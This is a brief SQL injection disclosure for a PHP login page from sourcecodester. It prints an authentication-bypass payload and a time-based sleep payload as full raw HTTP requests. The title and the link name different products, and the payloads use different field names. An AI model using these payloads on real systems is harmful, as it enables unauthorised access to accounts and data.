# Simple Inventory Management System by oretnom23 has SQL injection

BUG_Author: keecth

vendors: https://www.sourcecodester.com/php/15895/simple-customer-relationship-management-crm-system-using-php-free-source-coude.html

Vulnerability File: /php-scrm/login.php

Parameter "email" (POST), exists SQL injection vulnerability

Payload1: email=admin' or 1=1#&password=b&login=

```
POST /login.php HTTP/1.1
Host: 192.168.44.38:8890
Content-Length: 38
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.44.38:8890
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.44.38:8890/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=pvl1et2p8633oej125u0avedss
Connection: close

email=admin' or 1=1#&password=b&login=
```

Successfully logged in to the background(dashboard.php)

![image-20221202095720240](http://img.keecth.cn:55566/img/1669946240_ecd936c768adaf3e32e3d1ecf30f0686.png)

Payload2: email=a'%2b(select*from(select(sleep(20)))a)%2b'&pwd=b&login=

```
POST /login.php HTTP/1.1
Host: 192.168.44.38:8890
Content-Length: 61
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.44.38:8890
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.44.38:8890/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=pvl1et2p8633oej125u0avedss
Connection: close

email=a'%2b(select*from(select(sleep(20)))a)%2b'&pwd=b&login=
```

Response time is 20 seconds

![image-20221202100032345](http://img.keecth.cn:55566/img/1669946432_b17017ac17fed51966971d6ed1d2268b.png)